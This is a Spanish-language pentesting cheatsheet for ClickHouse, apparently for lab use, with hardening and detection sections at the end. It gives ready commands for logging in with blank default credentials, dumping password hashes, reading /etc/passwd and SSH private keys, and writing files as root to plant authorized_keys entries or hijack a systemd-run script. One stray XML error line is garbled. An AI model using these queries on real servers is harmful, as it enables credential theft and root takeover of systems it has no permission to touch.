---
topic: clickhouse
tags: [database, clickhouse, ssrf, file-write]
---

# ClickHouse — cheatsheet

[🇬🇧 English](cheatsheet.en.md) | **Español**

> Base columnar orientada a analítica. En labs aparece detrás de un vhost y en 8123 (HTTP) / 9000 (nativo).

## Acceso

```bash
# HTTP (el más habitual, incluso a través de nginx)
curl -s 'http://<HOST>:8123/?query=SELECT%20version()'
curl -s 'http://<HOST>:8123/?query=SELECT%20version()' --user 'default:'
curl -s 'http://<HOST>:8123/' --data-binary 'SELECT version() FORMAT TSV'

# CLI
clickhouse-client --host <HOST> --port 9000 --user default --password ''
clickhouse-client --host <HOST> --query "SHOW DATABASES"

# UI web
# http://<HOST>:8123/play
```

Usuarios por defecto que conviene probar: `default` sin contraseña, o los que salgan de un heapdump / `.env`.

## Enumeración

```sql
SELECT version();
SHOW DATABASES;
SHOW TABLES FROM <db>;
SHOW CREATE TABLE <db>.<tabla>;
SELECT * FROM system.users;              -- usuarios y hashes
SELECT * FROM system.settings LIMIT 5;
SELECT name, value FROM system.settings WHERE name LIKE '%file%';
```

```bash
# volcar una tabla a TSV
curl -s 'http://<HOST>:8123/' --data-binary 'SELECT * FROM <db>.<t> FORMAT TSVWithNames'
```

`system.users` guarda `name`, `auth_type` y el hash (SHA256 en versiones modernas), útil cuando se reutiliza contraseña.

## Lectura de ficheros

```sql
SELECT * FROM file('/etc/passwd', 'LineAsString');
SELECT * FROM file('/home/<user>/.ssh/id_rsa', 'LineAsString');
```

Con `format` distinto se leen binarios en bruto; también existen `url()`, `s3()`, `mysql()`, `postgresql()` para SSRF y movimiento lateral.

## Escritura de ficheros (ojo: corre como el servicio)

```sql
INSERT INTO TABLE FUNCTION file('/tmp/pwned.txt', 'LineAsString', 'line String') VALUES ('hola');
SELECT 'contenido' INTO OUTFILE '/tmp/out.txt';
```

Si el servidor corre como root, esto es escritura arbitraria **como root**. El patrón clásico: sobrescribir un script que un `systemd` timer ejecuta como root.

```xml
<error>column with wrapper</error>
```

El mismo `INSERT INTO TABLE FUNCTION file(...)` sirve para colocar una clave pública en `authorized_keys` o un script en `/opt/...`.

## Persistencia y borrado

```sql
DROP TABLE IF EXISTS <db>.<t>;
TRUNCATE TABLE <db>.<t>;
```

Restaurar siempre lo tocado: en un lab la limpieza es parte del trabajo.

## Endurecimiento

- `default` sin contraseña deshabilitado; usuarios por aplicación con ACL (`GRANT SELECT ON db.* TO app`).
- Sin privilegios `FILE`, `S3`, `URL`, `REMOTE` para cuentas de aplicación.
- Puerto 8123/9000 sólo en localhost o red interna, nunca expuesto a Internet.
- `readonly=1` para cuentas de consulta.

## Detección

- Consultas con `file(`, `url(`, `INTO OUTFILE` en el log de queries.
- Ficheros nuevos en rutas del sistema con propietario del usuario del servicio.
- Peticiones HTTP a 8123 desde hosts no esperados.

## Referencias

- <https://clickhouse.com/docs/en/sql-reference/table-functions/file>
- <https://clickhouse.com/docs/en/operations/system-tables/users>
- <https://clickhouse.com/docs/en/operations/access-rights>
